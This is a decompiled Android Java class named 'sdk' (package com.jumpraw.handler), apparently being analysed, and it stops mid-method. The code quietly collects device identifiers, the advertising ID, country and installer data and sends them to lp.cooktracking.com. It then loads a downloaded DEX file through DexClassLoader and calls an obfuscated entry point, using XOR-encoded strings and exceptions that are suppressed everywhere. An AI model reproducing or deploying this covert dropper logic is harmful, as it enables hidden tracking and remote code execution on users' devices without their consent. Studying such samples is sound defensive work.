package com.jumpraw.handler;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.LocalServerSocket;
import android.net.http.SslCertificate;
import android.net.http.SslCertificate.DName;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.Map.Entry;
import java.util.concurrent.LinkedBlockingQueue;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.X509TrustManager;

import org.json.JSONObject;

public final class sdk {
    private static boolean k = false;
    private static Context s;
    private static Object u;
    private String H;
    private Context t;
    private boolean m = false;
    private boolean e = false;
    private static String G;
    private static final int Z = 0;
    private static final int l = 1;
    private static final int h = 2;
    private static final int Y = 3;
    private static final int f = 4;
    private static final int p = 5;
    private static final int O = 0;
    private static final int q = 1;
    private static final int N = 2;
    private static final int w = 3;
    private static final int g = 4;
    private boolean D = true;

    public static void init(final Context var0, final String var1) {
        try {
            sdk.b.u(new Runnable() {
                public void run() {
                    try {
                        sdk.s(var0, "" + var1);
                    } catch (Throwable var2) {
                    }

                }
            });
        } catch (Throwable var3) {
        }

    }

    private static void s(Context var0, String var1) {
        try {
            if (k) {
                return;
            }

            k = true;
            if (var0 == null) {
                return;
            }

            try {
                var0 = var0.getApplicationContext();
                s = var0;
            } catch (Throwable var4) {
                return;
            }

            if (s == null) {
                return;
            }

            s("init...");

            try {
                if (!k(var0)) {
                    s("reentry");
                    return;
                }

                (new sdk(var0, var1)).s();
            } catch (Throwable var3) {
            }
        } catch (Throwable var5) {
        }

    }

    private static boolean k(Context var0) {
        try {
            String var1 = var0.getPackageName(); //com.jumpraw.handler
            if (!sdk.x.u(var1)) {
                return false;
            } else {
                String var2 = ".o.llk.";
                var2 = var2 + var1;
                var2 = var2 + ".";

                String var3;
                try {
                    var3 = Secure.getString(var0.getContentResolver(), "android_id");
                    if (var3 != null) {
                        var2 = var2 + var3;
                    }
                } catch (Throwable var8) {
                }

                //.o.llk.com.jumpraw.handler.e38186fc6a4a7a3d
                var3 = sdk.a.t(var2.getBytes());
                //080a031095c59eaa47af08dd6aa66a8b
                if (!sdk.x.u(var3)) {
                    var3 = var2;
                }

                var3 = var3 + ".l";

                try {
                    LocalServerSocket var4 = new LocalServerSocket(var3);
                    u = var4;

                    try {
                        (new sdk.v(var4)).start();
                    } catch (Throwable var6) {
                    }

                    return true;
                } catch (Throwable var7) {
                    return false;
                }
            }
        } catch (Throwable var9) {
            return false;
        }
    }

    private sdk(Context var1, String var2) {
        this.t = var1;
        this.H = var2;
    }

    private void s() {
        try {
            sdk.b.u(new Runnable() {
                public void run() {
                    sdk.this.u();
                }
            });
        } catch (Throwable var2) {
        }

    }

    private void u() {
        try {
            u(this.t);
            this.O();
            this.k(false);
            this.x();
            s("i.1");
        } catch (Throwable var2) {
        }

    }

    private static void s(final String var0) {
        try {
            sdk.b.u(new Runnable() {
                public void run() {
                    try {
                        if (!sdk.H()) {
                            return;
                        }

                        Class.forName("android.util.Log").getMethod("d", String.class, String.class).invoke(null, "yzw", var0);
                    } catch (Throwable var2) {
                    }

                }
            });
        } catch (Throwable var2) {
        }

    }

    private static boolean H() {
        try {
            File var0 = (File) Class.forName("android.os.Environment").getMethod("getExternalStorageDirectory").invoke(null);
            if (var0 == null) {
            }

            File var1 = new File(var0, "lstckk");
            boolean var2 = var1.isDirectory();
            return var2;
        } catch (Throwable var3) {
            return false;
        }
    }

    private static String s(Context var0) {
        try {
            TelephonyManager var1 = (TelephonyManager) var0.getSystemService(Context.TELEPHONY_SERVICE);
            return var1.getNetworkCountryIso();
        } catch (Throwable var2) {
            return null;
        }
    }

    private String t() {
        return this.u((String) null);
    }

    private String u(String var1) {
        try {
            String var2 = Secure.getString(this.t.getContentResolver(), "android_id");
            return var2 == null ? var1 : var2;
        } catch (Throwable var3) {
            return var1;
        }
    }

    private String m() {
        try {
            return this.t.getPackageName();
        } catch (Throwable var2) {
            return "";
        }
    }

    private static String s(byte[] var0) {
        try {
            if (var0 != null && var0.length > 1) {
                int var1 = var0.length / 2;
                int var2 = var0.length - var1;
                int var3 = var2 - var1;
                byte[] var4 = new byte[var1];

                for (int var5 = 0; var5 < var1; ++var3) {
                    byte var6 = var0[var2 + var5];
                    byte var7 = var0[var3];
                    var4[var5] = (byte) ((var6 ^ var7) & 255);
                    ++var5;
                }

                String var9 = sdk.x.s(var4);
                if (!sdk.x.u(var9)) {
                    throw new sdk.f("");
                } else {
                    return var9;
                }
            } else {
                throw new sdk.f("");
            }
        } catch (Throwable var8) {
            return null;
        }
    }

    private static void u(final Context var0) {
        try {
            (new Thread(new Runnable() {
                public void run() {
                    try {
                        AdvertisingIdClient.AdInfo var1 = AdvertisingIdClient.s(var0);
                        sdk.G = var1.s();
                    } catch (Throwable var2) {
                    }

                }
            })).start();
        } catch (Throwable var2) {
        }

    }

    private byte[] u(byte[] var1) {
        try {
            byte[] var2 = sdk.a.s("file not found\\t:".getBytes(), this.u("").getBytes(), "!>_||".getBytes());
            SecretKeySpec var3 = new SecretKeySpec(var2, "AES");
            Cipher var4 = Cipher.getInstance("AES");
            var4.init(1, var3);
            return var4.doFinal(var1);
        } catch (Throwable var5) {
            return null;
        }
    }

    private byte[] H(byte[] var1) {
        try {
            byte[] var2 = sdk.a.s("file not found\\t: ".getBytes(), this.u("").getBytes(), "!>_||".getBytes());
            SecretKeySpec var3 = new SecretKeySpec(var2, "AES");
            Cipher var4 = Cipher.getInstance("AES");
            var4.init(2, var3);
            return var4.doFinal(var1);
        } catch (Throwable var5) {
            return null;
        }
    }

    private String H(String var1) {
        try {
            if (!sdk.x.u(var1)) {
                return null;
            } else {
                String var2 = var1 + ".>_!!!" + this.t();
                String var3 = sdk.a.t(var2.getBytes());
                return var3;
            }
        } catch (Throwable var4) {
            return null;
        }
    }

    private JSONObject k(String var1, JSONObject var2) {
        try {
            return new JSONObject(var1);
        } catch (Throwable var4) {
            return var2;
        }
    }

    private JSONObject e() {
        return this.t((String) null);
    }

    private JSONObject G() {
        try {
            return this.t("oldzbsk");
        } catch (Throwable var2) {
            return null;
        }
    }

    private JSONObject t(String var1) {
        try {
            synchronized (this) {
                if (!sdk.x.u(var1)) {
                    var1 = "oldzb";
                }

                String var3 = this.H(var1);
                if (!sdk.x.u(var3)) {
                    return null;
                } else {
                    var3 = var3 + ".d";
                    File var4 = new File(this.t.getFilesDir(), var3);
                    byte[] var5 = sdk.a.s(var4);
                    if (var5 != null && var5.length > 0) {
                        byte[] var6 = this.H(var5);
                        if (var6 != null && var6.length > 0) {
                            String var7 = sdk.x.s(var6);
                            if (!sdk.x.u(var7)) {
                                return null;
                            } else {
                                JSONObject var8 = this.k((String) var7, (JSONObject) null);
                                return var8 == null ? null : var8;
                            }
                        } else {
                            return null;
                        }
                    } else {
                        return null;
                    }
                }
            }
        } catch (Throwable var11) {
            return null;
        }
    }

    private void k(JSONObject var1) {
        this.k(var1, "oldzbsk");
    }

    private void Z() {
        try {
            this.k(new JSONObject(), "oldzbsk");
        } catch (Throwable var2) {
        }

    }

    private void s(JSONObject var1) {
        this.k(var1, "oldzblp");
    }

    private JSONObject l() {
        try {
            return this.t("oldzblp");
        } catch (Throwable var2) {
            return null;
        }
    }

    private void u(JSONObject var1) {
        this.k((JSONObject) var1, (String) null);
    }

    private void k(JSONObject var1, String var2) {
        FileOutputStream var3 = null;

        try {
            synchronized (this) {
                if (var1 == null) {
                    return;
                }

                if (!sdk.x.u(var2)) {
                    var2 = "oldzb";
                }

                String var5 = this.H(var2);
                if (!sdk.x.u(var5)) {
                    return;
                }

                var5 = var5 + ".d";
                String var6 = var1.toString();
                if (!sdk.x.u(var6)) {
                    return;
                }

                byte[] var7 = sdk.x.t(var6);
                if (var7 != null && var7.length > 0) {
                    byte[] var8 = this.u(var7);
                    if (var8 != null && var8.length > 0) {
                        File var9 = new File(this.t.getFilesDir(), var5);
                        var3 = new FileOutputStream(var9);
                        var3.write(var8);
                        var3.flush();
                        var3.close();
                        var3 = null;
                        return;
                    }

                    return;
                }

                return;
            }
        } catch (Throwable var16) {
        } finally {
            sdk.a.s((Closeable) var3);
        }

    }

    private void k(String var1, String var2) {
        try {
            JSONObject var3 = this.e();
            if (var3 == null) {
                var3 = new JSONObject();
            }

            var3.put(var1, var2);
            this.u(var3);
        } catch (Throwable var4) {
        }

    }

    private String s(String var1, String var2) {
        try {
            JSONObject var3 = this.e();
            if (var3 == null) {
                return var2;
            } else {
                String var4 = var3.optString(var1, var2);
                return var4;
            }
        } catch (Throwable var5) {
            return var2;
        }
    }

    private void k(String var1, int var2) {
        try {
            JSONObject var3 = this.e();
            if (var3 == null) {
                var3 = new JSONObject();
            }

            var3.put(var1, var2);
            this.u(var3);
        } catch (Throwable var4) {
        }

    }

    private int s(String var1, int var2) {
        try {
            JSONObject var3 = this.e();
            if (var3 == null) {
                return var2;
            } else {
                int var4 = var3.optInt(var1, var2);
                return var4;
            }
        } catch (Throwable var5) {
            return var2;
        }
    }

    private void k(String var1, long var2) {
        try {
            JSONObject var4 = this.e();
            if (var4 == null) {
                var4 = new JSONObject();
            }

            var4.put(var1, var2);
            this.u(var4);
        } catch (Throwable var5) {
        }

    }

    private long s(String var1, long var2) {
        try {
            JSONObject var4 = this.e();
            if (var4 == null) {
                return var2;
            } else {
                long var5 = var4.optLong(var1, var2);
                return var5;
            }
        } catch (Throwable var7) {
            return var2;
        }
    }

    private boolean k(File var1, String var2) {
        FileInputStream var3 = null;

        boolean var5;
        try {
            boolean var4;
            if (var1 != null) {
                if (!sdk.x.u(var2)) {
                    var4 = false;
                    return var4;
                }

                var3 = new FileInputStream(var1);
                MessageDigest var17 = MessageDigest.getInstance("MD5");
                var17.update(">>>dgk".getBytes());
                byte[] var18 = new byte[1024];
                boolean var6 = false;

                int var19;
                while ((var19 = var3.read(var18)) > 0) {
                    var17.update(var18, 0, var19);
                }

                var3.close();
                var3 = null;
                var17.update("<<<klzz".getBytes());
                byte[] var7 = var17.digest();
                if (var7 != null && var7.length > 0) {
                    String var20 = sdk.a.u(var7);
                    boolean var9;
                    if (!sdk.x.u(var20)) {
                        var9 = false;
                        return var9;
                    }

                    if (!var20.equals(var2)) {
                        var9 = false;
                        return var9;
                    }

                    var9 = true;
                    return var9;
                }

                boolean var8 = false;
                return var8;
            }

            var4 = false;
            return var4;
        } catch (FileNotFoundException var14) {
            var5 = false;
        } catch (Throwable var15) {
            var5 = false;
            return var5;
        } finally {
            sdk.a.s((Closeable) var3);
        }

        return var5;
    }

    private String k(JSONObject var1, String var2, String var3) {
        try {
            return var1 == null ? var3 : var1.optString(var2, var3);
        } catch (Throwable var5) {
            return var3;
        }
    }

    private void s(JSONObject var1, String var2, String var3) {
        try {
            if (var1 == null) {
                return;
            }

            var1.put(var2, var3);
        } catch (Throwable var5) {
        }

    }

    private int k(JSONObject var1, String var2, int var3) {
        try {
            return var1 == null ? var3 : var1.optInt(var2, var3);
        } catch (Throwable var5) {
            return var3;
        }
    }

    private void s(JSONObject var1, String var2, int var3) {
        try {
            if (var1 == null) {
                return;
            }

            var1.put(var2, var3);
        } catch (Throwable var5) {
        }

    }

    private String H(JSONObject var1) {
        return this.k((JSONObject) var1, "lp", (String) null);
    }

    private int t(JSONObject var1) {
        return this.k((JSONObject) var1, "ver", 0);
    }

    private String m(JSONObject var1) {
        return this.k((JSONObject) var1, "dg", (String) null);
    }

    private String e(JSONObject var1) {
        return this.k((JSONObject) var1, "llp", (String) null);
    }

    private String h() {
        try {
            JSONObject var1 = this.G();
            return this.e(var1);
        } catch (Throwable var2) {
            return null;
        }
    }

    private int G(JSONObject var1) {
        return this.k((JSONObject) var1, "ts", 0);
    }

    private void s(JSONObject var1, String var2) {
        this.s(var1, "lp", var2);
    }

    private void u(JSONObject var1, String var2) {
        this.s(var1, "llp", var2);
    }

    private void k(JSONObject var1, int var2) {
        this.s(var1, "ver", var2);
    }

    private void H(JSONObject var1, String var2) {
        this.s(var1, "dg", var2);
    }

    private void s(JSONObject var1, int var2) {
        this.s(var1, "ts", var2);
    }

    private File Y() {
        return this.l((JSONObject) null);
    }

    private boolean Z(JSONObject var1) {
        try {
            if (var1 == null) {
                return false;
            } else {
                String var2 = this.H(var1);
                if (!sdk.x.u(var2)) {
                    return false;
                } else {
                    File var3 = new File(var2);
                    if (!var3.exists()) {
                        return false;
                    } else {
                        String var4 = this.m(var1);
                        if (!sdk.x.u(var4)) {
                            return false;
                        } else {
                            return this.k(var3, var4);
                        }
                    }
                }
            }
        } catch (Throwable var5) {
            return false;
        }
    }

    private File l(JSONObject var1) {
        try {
            if (var1 == null) {
                var1 = this.G();
            }

            if (var1 == null) {
                return null;
            } else {
                String var2 = this.H(var1);
                if (!sdk.x.u(var2)) {
                    return null;
                } else if (!this.Z(var1)) {
                    return null;
                } else {
                    File var3 = new File(var2);
                    return var3;
                }
            }
        } catch (Throwable var4) {
            return null;
        }
    }

    private void k(String var1, String var2, int var3) {
        try {
            if (!sdk.x.u(var1)) {
                return;
            }

            if (!sdk.x.u(var2)) {
                return;
            }

            JSONObject var4 = this.G();
            if (var4 == null) {
                var4 = new JSONObject();
            }

            String var5 = this.H(var4);
            if (sdk.x.u(var5)) {
                if (!var5.equals(var1)) {
                    this.u(var4, var5);
                } else {
                    this.u((JSONObject) var4, (String) null);
                }
            }

            this.s(var4, var1);
            this.H(var4, var2);
            this.k(var4, var3);
            this.k(var4);
            JSONObject var6 = this.e();
            if (var6 == null) {
                var6 = new JSONObject();
            }

            this.f(var6);
            this.Y(var6);
            this.u(var6, 0);
            this.u(var6);
        } catch (Throwable var7) {
        }

    }

    private int h(JSONObject var1) {
        try {
            return var1 == null ? 0 : var1.optInt("llec", 0);
        } catch (Throwable var3) {
            return 0;
        }
    }

    private void u(JSONObject var1, int var2) {
        try {
            if (var1 == null) {
                return;
            }

            var1.put("llec", var2);
        } catch (Throwable var4) {
        }

    }

    private int f() {
        return this.s("lls", 0);
    }

    private void Y(JSONObject var1) {
        try {
            if (var1 == null) {
                return;
            }

            var1.put("lls", 0);
        } catch (Throwable var3) {
        }

    }

    private void k(int var1) {
        this.k(var1, 0);
    }

    private void k(int var1, int var2) {
        try {
            JSONObject var3 = this.e();
            if (var3 == null) {
                var3 = new JSONObject();
            }

            var3.put("lls", var1);
            switch (var1) {
                case 1:
                    this.k(var3, 3, 1);
                case 2:
                default:
                    break;
                case 3:
                    this.k(var3, 0, 1);
                    break;
                case 4:
                    this.k(var3, 1, 1);
                    this.u(var3, var2);
                    break;
                case 5:
                    this.k(var3, 2, 1);
            }

            this.u(var3);
        } catch (Throwable var4) {
        }

    }

    private void f(JSONObject var1) {
        try {
            if (var1 == null) {
                return;
            }

            for (int var2 = 0; var2 < 4; ++var2) {
                this.k(var1, var2, -100);
            }

            this.u(var1, 0);
        } catch (Throwable var3) {
        }

    }

    private int[] p() {
        try {
            JSONObject var1 = this.e();
            return var1 == null ? null : this.p(var1);
        } catch (Throwable var2) {
            return null;
        }
    }

    private int[] p(JSONObject var1) {
        Object var2 = null;

        try {
            int[] var5 = new int[4];
            Arrays.fill(var5, 0);
            if (var1 == null) {
                return var5;
            } else {
                for (int var3 = 0; var3 < 4; ++var3) {
                    var5[var3] = this.H(var1, var3);
                }

                return var5;
            }
        } catch (Throwable var4) {
            return (int[]) var2;
        }
    }

    private int k(int[] var1, int var2) {
        try {
            return var1 != null && var2 >= 0 && var2 < var1.length ? var1[var2] : 0;
        } catch (Throwable var4) {
            return 0;
        }
    }

    private int H(JSONObject var1, int var2) {
        try {
            if (var1 == null) {
                return 0;
            } else if (var2 >= 0 && var2 < 4) {
                String var3 = s(new byte[]{12, -33, 102, 126, -68, 72}) + var2;
                int var4 = var1.optInt(var3, 0);
                return var4;
            } else {
                return 0;
            }
        } catch (Throwable var5) {
            return 0;
        }
    }

    private void k(JSONObject var1, int var2, int var3) {
        try {
            if (var1 == null) {
                return;
            }

            if (var2 < 0 || var2 >= 4) {
                return;
            }

            String var4 = "rc." + var2;
            int var5 = var1.optInt(var4, 0);
            int var6 = var3 != -100 ? var5 + var3 : 0;
            if (var6 < 0) {
                var6 = 0;
            }

            var1.put(var4, var6);
        } catch (Throwable var7) {
        }

    }

    private void k(File var1) {
        try {
            if (var1 == null) {
                return;
            }

            String var2 = var1.getName();
            if (var2.length() <= 4) {
                return;
            }

            String var3 = var2.substring(0, var2.length() - 3) + "dex";
            File var4 = new File(var1.getParentFile(), var3);
            if (var4.exists()) {
                boolean var5 = var4.delete();
            }
        } catch (Throwable var6) {
        }

    }

    private void O() {
        try {
            JSONObject var1 = this.G();
            if (var1 == null) {
                return;
            }

            String var2 = this.e(var1);
            if (!sdk.x.u(var2)) {
                return;
            }

            String var3 = this.H(var1);
            if (sdk.x.u(var3)) {
                String var4 = (new File(var2)).getName();
                String var5 = (new File(var3)).getName();
                if (sdk.x.u(var4) && sdk.x.u(var5) && var5.equals(var4)) {
                    return;
                }
            }

            File var8 = new File(var2);
            if (var8.exists()) {
                try {
                    boolean var9 = var8.delete();
                } catch (Throwable var6) {
                }
            }

            this.k(var8);
        } catch (Throwable var7) {
        }

    }

    private void q() {
        try {
            if (this.m) {
                return;
            }

            if (!this.N()) {
                this.k(1);
                return;
            }

            this.w();
        } catch (Throwable var2) {
        }

    }

    private boolean N() {
        try {
            int var1 = this.f();
            if (var1 == 2) {
                var1 = 5;
                this.k(var1);
            }

            JSONObject var2 = this.e();
            if (var2 == null) {
                return true;
            } else {
                int[] var3 = this.p(var2);
                if (var3 != null && var3.length >= 4) {
                    if (var1 == 5) {
                        return false;
                    } else if (var1 == 0) {
                        return true;
                    } else if (var1 != 3 && var1 != 4) {
                        int var4 = this.k((int[]) var3, 2);
                        int var5 = this.k((int[]) var3, 0);
                        if (var4 >= 10 && var4 / 2 > var5) {
                            return false;
                        } else {
                            byte var6 = 3;
                            int var7 = sdk.a.s().nextInt(var6);
                            return var7 == 0;
                        }
                    } else {
                        return true;
                    }
                } else {
                    return true;
                }
            }
        } catch (Throwable var8) {
            return true;
        }
    }

    private void w() {
        try {
            File var1 = this.Y();
            if (var1 == null) {
                return;
            }

            if (!var1.exists()) {
                return;
            }

            this.k(2);
            var1 = var1.getAbsoluteFile();
            this.k(var1);
            int var2 = this.u(var1.getAbsolutePath(), var1.getParent());
            if (var2 < 1) {
                this.k(4, var2);
                return;
            }

            this.k(3);
            this.m = true;
        } catch (Throwable var3) {
            this.k(4, -6000);
        }

    }

    private int u(String var1, String var2) {
        try {
            Object var3 = null;

            try {
                Method var13 = Context.class.getMethod("getClassLoader");
                var3 = var13.invoke(this.t);
            } catch (Throwable var11) {
            }

            Class var14;
            if (var3 == null) {
                var14 = this.getClass();
                Method var5 = Class.class.getMethod("getClassLoader");
                var3 = var5.invoke(var14);
            }

            var14 = Class.forName("dalvik.system.DexClassLoader");
            Constructor var15 = var14.getConstructor(String.class, String.class, String.class, ClassLoader.class);
            Object var6 = var15.newInstance(var1, var2, null, var3);
            Method var7 = var14.getMethod("loadClass", String.class);
            Class var8 = (Class) var7.invoke(var6, "com.f.w.a");
            Method var9 = var8.getDeclaredMethod("b", Class.forName(s(new byte[]{116, 50, 18, -51, -8, -32, -10, -89, 31, 24, 115, -32, 67, -115, -54, 116, -17, -85, 76, 47, 126, 120, -84, -114, -127, -40, -53, 126, 118, 20, -50, 12, -17, -96, 17, -116, -33, 119})));
            var9.setAccessible(true);
            int var10 = (Integer) var9.invoke(null, (Object) new Object[]{this.t, this.H, s(new byte[]{106, 66, -116, -44, 44, 122, -17, 98, -81, -42, -87, -77, -126, 42, 127, 13, 51, -85, 9, -108, -52, 59, 103, -4, -35, 125, -6, -91, -11, 3, -125, 113, 67, 66, -78, -53, 41, 64, -82, 19, 3, -42, -108, -126, 97, -3, -128, 10, 105, -112, 28, 98, 120, 94, 51, 78, -68, 91, 113, 12, 4, 45, -124, 114, -38, -47, 120, -67, -65, -60, 10, 72, 118, -68, 14, -106, -33, 85, 121, -115, -69, -82, 12, 113, -99, -117, -21, -30, -56, 109, 117, 41, 111, -49, -128, 111, 12, 68, 50, 10, 89, -100, 94, 12, -94, -101, -33, -71, 83, -89, 73, -4, 94, -128, -24, -75, -114, 16, -109, 33, 91, 38, 119, -69, 20, -55, 36, -20, -84, 84, 54, -33, -14, -117, -17, -107, 99, 113, -33, -74, -74, 12, 116, 51, -108, 31, -76, 72, -63, -83, 125, -56, -32, 55, -19, 82, 60, 124, 110, -126, 93, 123, -23, -31, 24, 79, -33, 3, -54, -75, -112, -127, -74, 27, 74, 108, 6, -103, 62, -10, -83, 94, 6, -54, -20, 25, -101, -63, -109, 48, -79, 72, 34, 117, -118, -13, 75, 116, -106, 43, 102, -78, -90, -76, 4, -54, -79, 51, 93, -12, 126, 1, 79, 60, 6, 45, -114, 57, 72, 56, 101, 76, -75, 16, -23, -26, 64, -40, -120, -14, 60, 124, 71, -39, 63, -91, -20, 55, 72, -65, -115, -51, 59, 69, -84, -22, -46, -37, -82, 92, 20, 77, 95, -85, -72, 93, 105, 37, 2, 57, 56, -2, 56, 57, -108, -86, -26, -118, 106, -109, 47, -51, 58, -80, -118, -126, -73, 114, -14, 22, 57, 21, 66, -125, 113, -2, 16, -43, -49, 50, 7, -21, -59, -23, -119, -94, 87, 20, -17, -41, -122, 60, 22, 5, -96, 41, -47, 127, -7, -52, 69, -86, -48, 0, -40, 48, 12, 30, 12, -76})});
            return var10;
        } catch (Throwable var12) {
            if (var12 instanceof InvocationTargetException) {
                Throwable var4 = ((InvocationTargetException) var12).getTargetException();
            }

            return -5000;
        }
    }

    private long g() {
        return this.s("r_lqt", 0L);
    }

    private void k(long var1) {
        try {
            this.k("r_lqt", var1);
        } catch (Throwable var4) {
        }

    }

    private void s(int var1) {
        this.k("r_lpt", var1);
    }

    private void t(JSONObject var1, int var2) {
        try {
            if (var1 == null) {
                return;
            }

            var1.put("r_lpt", var2);
        } catch (Throwable var4) {
        }

    }

    private int O(JSONObject var1) {
        try {
            return var1 == null ? 0 : var1.optInt("r_lpt", 0);
        } catch (Throwable var3) {
            return 0;
        }
    }

    private String q(JSONObject var1) {
        String var2 = G;

        try {
            if (var1 == null) {
                return var2;
            } else {
                String var3 = var1.optString("gid", (String) null);
                return !sdk.x.u(var3) ? var2 : var3;
            }
        } catch (Throwable var4) {
            return var2;
        }
    }

    private void t(JSONObject var1, String var2) {
        try {
            if (var1 == null) {
                return;
            }

            if (!sdk.x.u(var2)) {
                return;
            }

            var1.put("gid", var2);
        } catch (Throwable var4) {
        }

    }

    private void k(long var1, int var3, String var4) {
        try {
            JSONObject var5 = this.e();
            if (var5 == null) {
                var5 = new JSONObject();
            }

            this.k(var5, var1);
            this.t(var5, var3);
            this.t(var5, var4);
            this.u(var5);
        } catch (Throwable var6) {
        }

    }

    private long D() {
        return this.s("r_nqt", 0L);
    }

    private void s(long var1) {
        this.k("r_nqt", var1);
    }

    private void k(JSONObject var1, long var2) {
        try {
            if (var1 == null) {
                return;
            }

            var1.put("r_nqt", var2);
        } catch (Throwable var5) {
        }

    }

    private long C() {
        return this.s("r_ldt", 0L);
    }

    private void u(long var1) {
        this.k("r_ldt", var1);
    }

    private void x() {
        sdk.b.s(new Runnable() {
            public void run() {
                try {
                    sdk.this.T();
                    sdk.b.s(this, 60000L);
                } catch (Throwable var2) {
                }

            }
        }, 10000L);
    }

    private boolean L() {
        try {
            long var1 = System.currentTimeMillis();
            long var3 = this.D();
            if (var3 > 0L && var1 < var3) {
                return false;
            } else {
                long var5 = this.g();
                long var7 = 180000L;
                return var1 - var5 >= var7;
            }
        } catch (Throwable var9) {
            return false;
        }
    }

    private void T() {
        try {
            if (!this.L()) {
                try {
                    if (this.D) {
                        this.D = false;
                        s("i.2 skip");
                    }
                } catch (Throwable var3) {
                }

                this.X();
                return;
            }

            this.k(System.currentTimeMillis());
            final JSONObject var1 = this.e();
            final JSONObject var2 = this.G();
            (new Thread(new Runnable() {
                public void run() {
                    try {
                        sdk.this.k(var1, var2);
                    } catch (Throwable var2x) {
                    }

                }
            })).start();
        } catch (Throwable var4) {
        }

    }

    private void k(JSONObject var1, JSONObject var2) {
        sdk.g var3 = null;

        try {
            if (var1 == null) {
                var1 = new JSONObject();
            }

            this.D = false;
            s("i.2");
            JSONObject var4 = new JSONObject();
            JSONObject var5 = new JSONObject();
            var5.put("pkg", this.m());
            var5.put("ver", sdk.AppInfo.m(this.t));
            var5.put("is_system", sdk.AppInfo.e(this.t));
            var5.put("installer", sdk.AppInfo.G(this.t));
            var4.put("app", var5);
            var4.put("ver", 8);
            var4.put("ct", "zw213c4c63");
            var4.put("cp", "p.zw2dd9e3f");
            var4.put("at", this.H);
            var4.put("iso", s(this.t));
            var4.put("lt", this.O(var1));
            JSONObject var6 = new JSONObject();
            var6.put("g", this.q(var1));
            var6.put("a", this.t());
            var6.put("m", sdk.r.t());
            var6.put("b", sdk.r.m());
            var6.put("f", sdk.r.e());
            var6.put("o", sdk.r.G());
            var4.put("d", var6);
            if (var2 != null) {
                File var7 = this.l(var2);
                if (var7 != null) {
                    JSONObject var8 = new JSONObject();
                    var8.put("ver", this.t(var2));
                    var8.put("lt", this.G(var2));
                    int[] var9 = this.p(var1);
                    var8.put("sc", this.k((int[]) var9, 0));
                    var8.put("fc", this.k((int[]) var9, 1));
                    var8.put("cc", this.k((int[]) var9, 2));
                    var8.put("kc", this.k((int[]) var9, 3));

                    try {
                        var8.put("le", this.h(var1));
                    } catch (Throwable var26) {
                    }

                    var4.put("l", var8);
                }
            }

            String var29 = var4.toString();
            byte[] var30 = sdk.x.t(var29);
            String var31 = "https://lp.cooktracking.com/v1/ls/get";
            sdk.e var10 = new sdk.e("POST", var31);
            var10.k(var30);
            var3 = var10.k(true);
            if (var3 == null) {
                throw new sdk.f("");
            }

            if (var3.s() == null || var3.s().k != 0) {
                throw new sdk.f("");
            }

            if (var3.u() == null || var3.u().k != 200) {
                throw new sdk.f("");
            }

            InputStream var11 = var3.H();
            if (var11 == null) {
                throw new sdk.f("");
            }

            ByteArrayOutputStream var12 = new ByteArrayOutputStream();
            int var13 = sdk.a.s((InputStream) var11, (OutputStream) var12);
            if (var13 <= 0) {
                throw new sdk.f("");
            }

            byte[] var14 = var12.toByteArray();
            String result = new String(var14);
            if (var14 == null || var14.length <= 0) {
                throw new sdk.f("");
            }

            String var15 = sdk.x.s(var14);
            if (!sdk.x.u(var15)) {
                throw new sdk.f("");
            }

            JSONObject var16 = new JSONObject(var15);
            this.D = false;
            s("i.2 pass");
            this.N(var16);
        } catch (Throwable var27) {
            this.D = false;
            s("i.2 fail");
            this.N((JSONObject) null);
        } finally {
            try {
                if (var3 != null) {
                    var3.k();
                }
            } catch (Throwable var25) {
            }

        }

    }

    private void N(final JSONObject var1) {
        try {
            sdk.b.H(new Runnable() {
                public void run() {
                    try {
                        sdk.this.w(var1);
                    } catch (Throwable var2) {
                    }

                }
            });
        } catch (Throwable var3) {
        }

    }

    private void w(JSONObject var1) {
        try {
            if (var1 == null) {
                this.k(true);
                return;
            }

            String var2 = var1.optString("g", (String) null);
            int var3 = var1.optInt("nh", 0);
            if (var3 <= 1) {
                var3 = 8;
            }

            long var4 = System.currentTimeMillis() + (long) var3 * 3600000L;
            int var6 = var1.optInt("t", 0);
            this.k(var4, var6, var2);
            this.s(var1);
            this.k(true);
        } catch (Throwable var7) {
            this.k(true);
        }

    }

    private void X() {
        try {
            if (this.e) {
                return;
            }

            this.e = true;
            this.k(true);
        } catch (Exception var2) {
        }

    }

    private void k(boolean var1) {
        try {
            JSONObject var2 = this.l();
            if (var2 == null) {
                return;
            }

            JSONObject var3 = var2.optJSONObject("l");
            if (var3 == null) {
                return;
            }

            JSONObject var4 = this.G();
            if (var4 == null || !this.Z(var4)) {
                if (var1) {
                    this.g(var3);
                }

                return;
            }

            int var5 = var3.optInt("ver", 0);
            if (var5 <= 0) {
                return;
            }

            int var6 = var3.optInt("e", 0);
            int var7 = this.t(var4);
            if (var7 == var5) {
                this.q();
                return;
            }

            if (var6 == 1) {
                if (var1) {
                    this.g(var3);
                }

                return;
            }

            if (var1) {
                int[] var8 = this.p();
                if (var8 != null && var8.length > 0) {
                    int var9 = this.k((int[]) var8, 1);
                    int var10 = this.k((int[]) var8, 2);
                    int var11 = this.k((int[]) var8, 0);
                    if (var10 >= 5 || var9 + var10 >= var11 + 5) {
                        this.g(var3);
                    }
                }
            }

            this.q();
        } catch (Throwable var12) {
        }

    }

    private void g(final JSONObject var1) {
        try {
            (new Thread(new Runnable() {
                public void run() {
                    try {
                        sdk.this.D(var1);
                    } catch (Throwable var2) {
                    }

                }
